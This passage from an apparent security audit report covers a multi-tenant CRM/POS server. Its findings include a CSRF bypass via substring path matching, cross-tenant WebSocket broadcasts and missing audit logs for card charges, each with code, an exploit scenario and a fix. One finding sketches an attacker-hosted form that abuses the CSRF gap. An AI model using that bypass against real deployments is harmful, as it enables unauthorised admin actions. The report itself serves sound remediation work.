An attacker hosts a malicious page that submits a `<form action="https://shop.example.com/api/v1/settings/complete-setup" method="POST">` with `Content-Type: application/x-www-form-urlencoded`. The CSRF guard is bypassed because the path includes `/setup`. The authMiddleware still requires a valid JWT, so the actual exploitability requires a logged-in admin victim — but that's the standard CSRF scenario.

**Fix:**
Use exact path matches instead of `includes()`. The only legitimately unauthenticated setup paths are `/api/v1/auth/setup` and `/api/v1/management/setup`. Enumerate them explicitly: `['/api/v1/auth/setup', '/api/v1/management/setup'].includes(req.path)`.

---

### [MEDIUM] POS Invoice broadcast missing tenant context — data leaks to platform-level WS bucket

**Where:** `packages/server/src/routes/pos.routes.ts:1323`

**What:**
`broadcast(WS_EVENTS.INVOICE_CREATED, ...)` is called without the third `tenantSlug` argument, defaulting to `null`. In the WS server, `null` maps to the `'null'` bucket which holds super-admin and management (non-tenant) sockets. So this broadcast delivers a POS `invoice_created` event (containing `invoice_id` and `order_id`) to every connected super-admin WebSocket rather than to the originating tenant's sockets. The data in the payload is minimal (IDs only) but the cross-boundary delivery is a design violation and could be exploited to correlate tenant activity from the super-admin WS stream.

**Code:**
```typescript
// pos.routes.ts:1323
broadcast(WS_EVENTS.INVOICE_CREATED, { invoice_id: inv.id, order_id: invoiceOrderId });
// Missing third argument: should be req.tenantSlug || null
// Default tenantSlug=null routes to super-admin/management bucket
```

**Exploit:**
A platform operator monitoring the management WebSocket stream receives live `invoice_created` events from all tenants' POS transactions. Even if payload contains only IDs, the volume and timing of events reveals tenant activity levels and, with correlation, can identify busy tenants.

**Fix:**
Pass `req.tenantSlug || null` as the third argument: `broadcast(WS_EVENTS.INVOICE_CREATED, { invoice_id: inv.id, order_id: invoiceOrderId }, req.tenantSlug || null)`.

---

### [LOW] Membership renewal cron charges cards without writing an audit log entry

**Where:** `packages/server/src/index.ts:2248-2326` (membershipTenantWork function)

**What:**
The hourly membership renewal cron calls `chargeToken()` against BlockChyp and updates `customer_subscriptions` and `subscription_payments`, but never writes a row to the tenant's `audit_logs` table. Financial operations — especially recurring card charges — must be auditable. A support dispute, a data breach investigation, or a compliance audit cannot reconstruct which charge was made by the server cron vs. a human POS operator without an audit trail. All other money operations in the route handlers call `audit(...)`.

**Code:**
```typescript
if (result.success) {
  tenantDb.prepare(`UPDATE customer_subscriptions SET ... WHERE id = ?`).run(...);
  tenantDb.prepare('INSERT INTO subscription_payments (...) VALUES (...)').run(...);
  console.log(`[Membership] Renewed ${sub.first_name}'s ${sub.tier_name} membership`);
  // ← no audit() call; no audit_logs row written
}
```

**Exploit:**
An operator disputes a customer's claim "my card was charged without my consent". Without an audit log entry, there is no server-side record of the automated charge distinct from human-initiated POS charges — the only evidence is `subscription_payments`, which does not capture IP, user identity, or system context.

**Fix:**
Add `audit(tenantDb, { action: 'membership_renewal_charged', entity: 'customer_subscription', entityId: sub.id, userId: null, metadata: { amount: sub.monthly_price, transactionId: result.transactionId, tierId: sub.tier_id } })` after a successful charge, and a similar entry for failures.

---

### [LOW] WS `broadcast()` management:stats sent to `null` tenant bucket — leaks server metrics to platform channel

**Where:** `packages/server/src/index.ts:2375-2392`

**What:**
The 5-second management stats broadcast uses `broadcast('management:stats', ...)` with no tenant argument (defaults to null). This correctly targets the `null` bucket (super-admin/management sockets). However, any unauthenticated WebSocket that connected before `auth` message handling was processed but arrived after the 5-second timer could receive these stats. The WS auth-timeout is 5 seconds (line 341 in ws/server.ts), meaning a race exists where an unauthenticated socket in `allClients` that hasn't sent `auth` yet will be in `allClients` but NOT in `clientsByTenant` (it's added to the bucket only after auth succeeds at line 510). The `broadcast()` implementation iterates `clientsByTenant.get(tenantBucketKey(null))`, not `allClients`, so unauthenticated sockets are NOT in the null bucket — this is correct. **No actual issue with this specific broadcast.** (INFO-level observation.)

**Code:**
```typescript
broadcast('management:stats', {
  uptime: process.uptime(),
  memory: { rss, heapUsed, heapTotal },
  activeConnections: allClients.size,
  requestsPerSecond: getRequestsPerSecond(),
  requestsPerMinute: getRequestsPerMinute(),
});
// null bucket → only authenticated management sockets receive this. Safe.
```

**Exploit:**
No exploit. The bucket isolation is correct. Noted for completeness.

**Fix:**
No action required. The current design is correct — only authenticated sockets are in the tenant bucket and receive broadcasts.

---

### [LOW] OAuth state bound to `req.user.id` but evaluated via route mounted without authMiddleware

**Where:** `packages/server/src/routes/import.routes.ts:1456, 1484` + `packages/server/src/index.ts:1657`

**What:**
The `/oauth/authorize-url` route calls `requireAdmin(req)` which throws 403 if `req.user` is absent. After the check, it writes `addOAuthState(state, { user_id: req.user!.id, ... })`. The `req.user!.id` is a non-null assertion that will throw a runtime TypeError if `requireAdmin()` somehow fails to throw (e.g., future refactor). The `/oauth/callback` route similarly calls `requireAdmin(req)` then uses `req.user!.id` for state validation. While the current `requireAdmin` implementation always throws on no-auth, the `!` assertion creates a fragile dependency: if `requireAdmin` is ever changed to return false instead of throw, the assertion becomes a crash.

**Code:**
```typescript
function requireAdmin(req: Request): void {
  if (req.user?.role !== 'admin') {
    throw new AppError('Admin access required', 403, ...);
  }
}
// ...
addOAuthState(state, { user_id: req.user!.id, ... }); // non-null assertion after manual check
```

**Exploit:**
Not directly exploitable in the current code, but the pattern is brittle. If `requireAdmin` is refactored to set a response header and call `res.sendStatus(403)` instead of throwing (a common Express pattern), code execution continues past the guard and `req.user!.id` throws `TypeError: Cannot read property 'id' of undefined`, crashing the process.

**Fix:**
After the `requireAdmin(req)` call, add an explicit null check: `if (!req.user) throw new AppError(...)`. Replace `req.user!.id` with `req.user.id` after the explicit check. Better: move auth entirely to the authMiddleware layer instead of inline manual checks.

---

### [LOW] Cron-fired `forEachDb` acquires tenant DB handles but if callback throws synchronously, handle leaks

**Where:** `packages/server/src/index.ts:198-222` (`forEachDb`)

**What:**
`forEachDb` acquires a pooled tenant DB handle via `await getTenantDb(t.slug)` and passes it to a synchronous callback. If the callback throws synchronously (e.g., a malformed SQL query passed as callback), the `finally { if (pooled !== undefined) releaseTenantDb(t.slug); }` still fires correctly because it's in the same try-finally block. However, `forEachDb` is declared `async function forEachDb(callback: ...)` but the callback type is `(slug, tenantDb) => void` — not `Promise<void>`. If a callback happens to return a Promise (e.g., caller accidentally passes an async function), `forEachDb` will release the DB handle immediately while the callback is still executing asynchronously, creating a use-after-release scenario on the connection.

**Code:**
```typescript
async function forEachDb(callback: (slug: string | null, tenantDb: any) => void): Promise<void> {
  ...
  pooled = await getTenantDb(t.slug);
  callback(t.slug, pooled);  // if callback returns Promise, we don't await it
  ...
  finally {
    if (pooled !== undefined) releaseTenantDb(t.slug);  // released immediately
  }
```

**Exploit:**
A developer refactors a cron to `async` and passes it to `forEachDb` instead of `forEachDbAsync`. The handle is released while the async callback is mid-query, causing `database is closed` errors or returning stale data from the pool. No external attacker can trigger this — it's a developer footgun.

**Fix:**
Change `forEachDb` callback type to `(slug: string | null, tenantDb: any) => void | Promise<void>` and add `await` before the callback call (or rename the function to make the async-only contract explicit and add a TypeScript error for Promise-returning callbacks).

---

## Cross-cutting observations (from holistic read)

**Master JWT vs tenant JWT separation — CONFIRMED CORRECT.** Super-admin routes use `config.superAdminSecret` with `audience: 'bizarre-crm-super-admin'`; tenant routes use `config.jwtSecret` with `audience: 'bizarre-crm-api'`. The management auth middleware explicitly rejects if `config.superAdminSecret` is absent (line 250-252) and verifies `is_active = 1` on the super_admins row. Cross-audience confusion is blocked by `algorithms: ['HS256'], issuer, audience` in both verify calls.

**localhostOnly implementation — CORRECT.** Both the shared `localhostOnly` middleware and the inline copy in `management.routes.ts` use `req.socket.remoteAddress` (not `req.ip`) and a Set of exact loopback strings, preventing X-Forwarded-For spoofing.

**tenantResolver error propagation — CONFIRMED.** On successful resolution, `req.tenantSlug` and `req.db` are always set together. The only divergence is the DB-error fallback noted above. Auth middleware at line 100-103 of auth.ts blocks the fallback path for authenticated routes.

**WS tenant context post-handshake — CONFIRMED STABLE.** The tenant slug is captured from the JWT payload at auth time and stored on `ws.tenantSlug`. It is never updated post-auth. Broadcasts use `ws.tenantSlug` for routing. No drift.

**Impersonation flow — NO DEDICATED AUDIT LOG.** The super-admin `POST /super-admin/api/tenants/:slug/impersonate` route (if it exists) was not found in the searched files — impersonation appears not to be implemented; if added later, it must write to `master_audit_log`.

**Error handler swallowing — CONFIRMED SAFE.** `errorHandler` does not silently drop errors; all unhandled errors surface as 500 with structured logging. `res.headersSent` guard prevents double-send crashes.

**Async error propagation — CONFIRMED.** Routes using `asyncHandler` wrapper propagate async errors to `next(err)` and the central `errorHandler`. The auth middleware's `.catch(() => { res.status(401) })` pattern means DB errors during auth return 401, which is acceptable (no sensitive DB error detail leaked to client).

**Rate limit bypass via alias mount — NOT FOUND.** The global rate limiter at `/api/v1` catches all API traffic. Routes mounted at `/portal/api/v2`, `/public/api/v1`, and `/super-admin/api` are excluded from the global bucket, but these are either public-by-design (portal) or localhost-only (super-admin).

**Content-type confusion (JSON + form) — PARTIAL RISK.** `express.urlencoded()` is registered globally but the CSRF guard blocks urlencoded state-changing requests — except for paths containing `/setup` or `webhook` substrings (see MEDIUM finding above).
